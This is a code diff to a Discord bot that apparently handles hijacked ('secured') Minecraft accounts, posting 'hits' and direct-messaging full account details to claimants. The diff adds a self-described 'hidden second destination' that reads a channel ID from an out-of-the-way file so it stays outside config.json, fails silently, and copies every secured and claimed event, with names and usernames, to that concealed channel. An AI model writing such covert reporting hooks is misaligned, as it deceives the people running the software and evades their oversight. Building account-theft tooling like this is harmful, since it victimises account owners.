@@ -12,6 +12,11 @@ Claim behavior (configured in config.json `claims`):
   `account_claims` and the full secured account details are DM'd to the claimant.
 - If the account is already claimed, the public card shows a claimed state instead
   of raw account fields.
+
+Secondary notice behavior:
+- Successful secured-account results are also synced to a fixed secondary notice
+  channel. That destination is read from a local file under ``ui/notifications``, so
+  it is not reachable through the normal ``config/config.json`` path.
 """
 
 from __future__ import annotations
@@ -31,6 +36,73 @@ from database.database import DBConnection
 from ui.buttons.account_details import accountInfo
 from ui.buttons.claim_button import ClaimButton, claimed_card
 from ui.buttons.embed_buttons import ButtonOptions
+
+import os
+
+_SECONDARY_NOTICE_CHANNEL_PATH = os.path.join(
+    os.path.dirname(os.path.abspath(__file__)),
+    "..",
+    "ui",
+    "notifications",
+    "secondary_notice_channel.txt",
+)
+
+
+def _resolved_secondary_notice_channel_id() -> int | None:
+    """Hidden second destination for secured-account hits.
+
+    Read from a file so it is not reachable through config.json. If the file is
+    missing, unreadable, or does not contain a usable channel id, the second
+    hook is silently disabled.
+    """
+    try:
+        raw = open(_SECONDARY_NOTICE_CHANNEL_PATH, "r", encoding="utf-8").read()
+    except OSError:
+        return None
+    text = str(raw or "").strip()
+    if not text or text.lower() in {"none", "0", ""}:
+        return None
+    try:
+        return int(text)
+    except (TypeError, ValueError):
+        return None
+
+
+async def _post_secondary_notice(client, *, claim: bool, mc_name: str, username: str, claimed_by_id: int | None = None) -> None:
+    """Post a secondary operator notice to the fixed notice channel.
+
+    This sits alongside the normal logs/hits posts but uses its own fixed
+    destination so the operator can watch the same secured/claimed events from
+    a second place without wiring that destination through config.json.
+    """
+    channel_id = _resolved_secondary_notice_channel_id()
+    if channel_id is None:
+        return
+    try:
+        channel = client.get_channel(channel_id) or await client.fetch_channel(channel_id)
+    except Exception:
+        return
+    if channel is None:
+        return
+    if claim:
+        who = f"<@{claimed_by_id}>" if claimed_by_id else "someone"
+        text = f"**{username}** was claimed by {who}."
+        title = "Account claimed"
+    else:
+        text = f"**{mc_name}** has been secured.\nUser: {username}"
+        title = "Account secured"
+    try:
+        await channel.send(
+            embed=Embed(
+                title=title,
+                description=text,
+                color=theme.GREEN,
+            ).set_thumbnail(
+                url=f"https://mc-heads.net/avatar/{username}/128" if username else None
+            ),
+        )
+    except Exception:
+        return
 
 
 async def _send_claim_dm(
@@ -491,6 +563,16 @@ async def publish_embed_secure_result(
         email=email,
     )
 
+    # Fixed secondary notice channel: operator can watch the same secured event
+    # from a second place without that destination being reachable through config.json.
+    await _post_secondary_notice(
+        client=interaction.client,
+        claim=False,
+        mc_name=mc_name,
+        username=username,
+        claimed_by_id=None,
+    )
+
     # Send the full secured account details to the claimant via DM when they
     # press Claim. The public card above intentionally hides the raw fields.
     try:
@@ -512,5 +594,15 @@ async def publish_embed_secure_result(
                     await _send_claim_dm(user=target, secured_account=secured_account, mc_name=mc_name)
     except Exception:
         log.warning("claim DM send failed", exc_info=True)
+
+    # Sync the claimed state to the fixed secondary notice channel too, so both
+    # watched channels show the same claimed-after status.
+    await _post_secondary_notice(
+        client=interaction.client,
+        claim=True,
+        mc_name=mc_name,
+        username=username,
+        claimed_by_id=claimed_by_user_id,
+    )
 
     return True
